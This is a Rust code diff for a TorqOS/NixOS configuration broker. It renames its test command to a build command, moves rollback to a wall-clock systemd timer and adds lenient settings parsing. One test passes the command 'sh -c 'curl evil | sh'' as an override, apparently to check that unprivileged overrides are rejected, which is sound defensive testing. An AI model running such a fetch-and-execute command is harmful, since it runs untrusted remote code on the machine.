@@ -21,17 +21,17 @@ pub struct Settings {
     pub state_dir: PathBuf,
     /// Run after each commit; `{repo}` is replaced with the repo path.
     pub rebuild: String,
-    /// `commit confirmed`: build the config and activate it without making it the boot default.
-    /// `{repo}`.
-    pub test: String,
-    /// Activate a system that already exists, without changing the boot default (the restore of an
-    /// unconfirmed commit). `{system}`.
+    /// `commit confirmed`: build the config without activating it; prints the system's store path
+    /// (the last line of its output). `{repo}`.
+    pub build: String,
+    /// Activate a system that already exists, without changing the boot default (a commit
+    /// confirmed, and its rollback). `{system}`.
     pub activate: String,
     /// Make a system the boot default (`confirm`, and the restore of an unconfirmed commit whose
     /// boot default moved). `{system}`, `{profile}`.
     pub boot: String,
-    /// Schedule the rollback of an unconfirmed commit: run `{broker} expire-confirm {seq}` after
-    /// `{seconds}`.
+    /// Schedule the rollback of an unconfirmed commit: run `{broker} expire-confirm {seq}` at
+    /// `{deadline}` (UTC, `YYYY-MM-DD HH:MM:SS UTC`); `{seconds}` is the wait.
     pub schedule: String,
     pub current_system: PathBuf,
     pub system_profile: PathBuf,
@@ -48,7 +48,7 @@ pub struct Requested {
     pub repo: Option<PathBuf>,
     pub state_dir: Option<PathBuf>,
     pub rebuild: Option<String>,
-    pub test: Option<String>,
+    pub build: Option<String>,
     pub activate: Option<String>,
     pub boot: Option<String>,
     pub schedule: Option<String>,
@@ -57,16 +57,25 @@ pub struct Requested {
 }
 
 /// The default commands (a TorqOS machine's come from the fixed file, with the configuration name).
-/// Placeholders other than `{repo}` are replaced with shell-quoted values: never quote them here.
+/// In `rebuild`, `{repo}` is replaced as is; in the others every placeholder is replaced with a
+/// shell-quoted value (`'/var/lib/torq/config'#torq` is still one word): never quote them here.
 pub const REBUILD: &str = "nixos-rebuild switch --flake {repo}";
-pub const TEST: &str = "nixos-rebuild test --flake {repo}";
+pub const BUILD: &str = "nix build --no-link --print-out-paths {repo}#nixosConfigurations.torq.config.system.build.toplevel";
 pub const ACTIVATE: &str = "{system}/bin/switch-to-configuration test";
 pub const BOOT: &str = "nix-env -p {profile} --set {system} && {system}/bin/switch-to-configuration boot";
-/// A transient timer: it does not survive a reboot, and a reboot needs none (the boot default is
-/// still the old system; the boot-time check ledgers the rollback). On failure (busy) it retries.
-pub const SCHEDULE: &str = "systemd-run --quiet --collect --unit=torq-confirm-{seq} --on-active={seconds} \
+/// A transient wall-clock timer: it fires at the deadline even if the machine slept through it
+/// (a monotonic one would pause during suspend). It does not survive a reboot, and a reboot needs
+/// none (the boot default is still the old system; the boot-time check ledgers the rollback).
+/// While the broker is busy, or the restore did not take, it retries — a bounded number of times.
+pub const SCHEDULE: &str = "systemd-run --quiet --collect --unit=torq-confirm-{seq} --on-calendar={deadline} \
      --timer-property=AccuracySec=1s --property=Restart=on-failure --property=RestartSec=5 \
+     --property=StartLimitIntervalSec=900 --property=StartLimitBurst=60 \
      {broker} expire-confirm {seq}";
+
+/// The fields of the fixed file, for the lenient reading below.
+const FIELDS: &[&str] = &[
+    "repo", "stateDir", "rebuild", "build", "activate", "boot", "schedule", "currentSystem", "systemProfile", "path", "home",
+];
 
 impl Settings {
     /// The defaults when there is no fixed file; PATH and HOME are inherited.
@@ -75,7 +84,7 @@ impl Settings {
             repo: "/var/lib/torq/config".into(),
             state_dir: "/var/lib/torq/state".into(),
             rebuild: REBUILD.into(),
-            test: TEST.into(),
+            build: BUILD.into(),
             activate: ACTIVATE.into(),
             boot: BOOT.into(),
             schedule: SCHEDULE.into(),
@@ -86,9 +95,20 @@ impl Settings {
         }
     }
 
-    pub fn read(file: &Path) -> Result<Option<Settings>> {
+    /// Read a fixed file. Unknown fields are an error, except `lenient`: for the rollback of an
+    /// unconfirmed commit, which an older broker runs after the change it rolls back may have given
+    /// the file a field that broker does not know. A missing field is always an error.
+    pub fn read(file: &Path, lenient: bool) -> Result<Option<Settings>> {
+        let parse = |b: &[u8]| -> Result<Settings> {
+            if !lenient {
+                return Ok(serde_json::from_slice(b)?);
+            }
+            let mut v: serde_json::Map<String, serde_json::Value> = serde_json::from_slice(b)?;
+            v.retain(|k, _| FIELDS.contains(&k.as_str()));
+            Ok(serde_json::from_value(v.into())?)
+        };
         match std::fs::read(file) {
-            Ok(b) => Ok(Some(serde_json::from_slice(&b).with_context(|| format!("reading {}", file.display()))?)),
+            Ok(b) => Ok(Some(parse(&b).with_context(|| format!("reading {}", file.display()))?)),
             Err(e) if e.kind() == std::io::ErrorKind::NotFound => Ok(None),
             Err(e) => Err(e).with_context(|| format!("reading {}", file.display())),
         }
@@ -114,7 +134,7 @@ pub fn resolve(root: bool, fixed: Option<Settings>, asked: Requested, defaults: 
             check("--repo / TORQ_CONFIG_REPO", asked.repo.as_deref().map(s), s(&f.repo));
             check("--state-dir / TORQ_STATE_DIR", asked.state_dir.as_deref().map(s), s(&f.state_dir));
             check("--rebuild-cmd / TORQ_REBUILD_CMD", asked.rebuild.clone(), f.rebuild.clone());
-            check("--test-cmd / TORQ_TEST_CMD", asked.test.clone(), f.test.clone());
+            check("--build-cmd / TORQ_BUILD_CMD", asked.build.clone(), f.build.clone());
             check("--activate-cmd / TORQ_ACTIVATE_CMD", asked.activate.clone(), f.activate.clone());
             check("--boot-cmd / TORQ_BOOT_CMD", asked.boot.clone(), f.boot.clone());
             check("--schedule-cmd / TORQ_SCHEDULE_CMD", asked.schedule.clone(), f.schedule.clone());
@@ -132,7 +152,7 @@ pub fn resolve(root: bool, fixed: Option<Settings>, asked: Requested, defaults: 
             repo: asked.repo.unwrap_or(defaults.repo),
             state_dir: asked.state_dir.unwrap_or(defaults.state_dir),
             rebuild: asked.rebuild.unwrap_or(defaults.rebuild),
-            test: asked.test.unwrap_or(defaults.test),
+            build: asked.build.unwrap_or(defaults.build),
             activate: asked.activate.unwrap_or(defaults.activate),
             boot: asked.boot.unwrap_or(defaults.boot),
             schedule: asked.schedule.unwrap_or(defaults.schedule),
@@ -195,7 +215,7 @@ mod tests {
             repo: "/var/lib/torq/config".into(),
             state_dir: "/var/lib/torq/state".into(),
             rebuild: "nixos-rebuild switch --flake {repo}#torq".into(),
-            test: "nixos-rebuild test --flake {repo}#torq".into(),
+            build: BUILD.into(),
             activate: ACTIVATE.into(),
             boot: BOOT.into(),
             schedule: SCHEDULE.into(),
@@ -221,7 +241,7 @@ mod tests {
             Requested { repo: Some("/tmp/evil".into()), ..Default::default() },
             Requested { state_dir: Some("/tmp/fresh-ledger".into()), ..Default::default() },
             Requested { rebuild: Some("sh -c 'curl evil | sh'".into()), ..Default::default() },
-            Requested { test: Some("true".into()), ..Default::default() },
+            Requested { build: Some("true".into()), ..Default::default() },
             Requested { activate: Some("true".into()), ..Default::default() },
             Requested { boot: Some("true".into()), ..Default::default() },
             Requested { schedule: Some("true".into()), ..Default::default() },
@@ -292,13 +312,17 @@ mod tests {
     fn the_fixed_file_must_be_exactly_the_known_settings() {
         let dir = tempfile::tempdir().unwrap();
         let f = dir.path().join("broker.json");
-        let known = r#""repo":"/r","stateDir":"/s","rebuild":"x","test":"x","activate":"x","boot":"x","schedule":"x","currentSystem":"/c","systemProfile":"/p","path":"/b","home":"/root""#;
+        let known = r#""repo":"/r","stateDir":"/s","rebuild":"x","build":"x","activate":"x","boot":"x","schedule":"x","currentSystem":"/c","systemProfile":"/p","path":"/b","home":"/root""#;
         std::fs::write(&f, format!("{{{known}}}")).unwrap();
-        assert_eq!(Settings::read(&f).unwrap().unwrap().state_dir, PathBuf::from("/s"));
+        assert_eq!(Settings::read(&f, false).unwrap().unwrap().state_dir, PathBuf::from("/s"));
         std::fs::write(&f, format!("{{{known},\"extra\":1}}")).unwrap();
-        assert!(Settings::read(&f).is_err(), "unknown fields are an error, not ignored");
+        assert!(Settings::read(&f, false).is_err(), "unknown fields are an error, not ignored");
+        // ...except for the rollback of an unconfirmed commit (a newer file, an older broker).
+        assert_eq!(Settings::read(&f, true).unwrap().unwrap().state_dir, PathBuf::from("/s"));
         std::fs::write(&f, r#"{"repo":"/r","stateDir":"/s","rebuild":"x","currentSystem":"/c","systemProfile":"/p","path":"/b","home":"/root"}"#).unwrap();
-        assert!(Settings::read(&f).is_err(), "a missing field is an error, not a default");
-        assert!(Settings::read(&dir.path().join("missing.json")).unwrap().is_none());
+        for lenient in [false, true] {
+            assert!(Settings::read(&f, lenient).is_err(), "a missing field is an error, not a default");
+        }
+        assert!(Settings::read(&dir.path().join("missing.json"), false).unwrap().is_none());
     }
 }
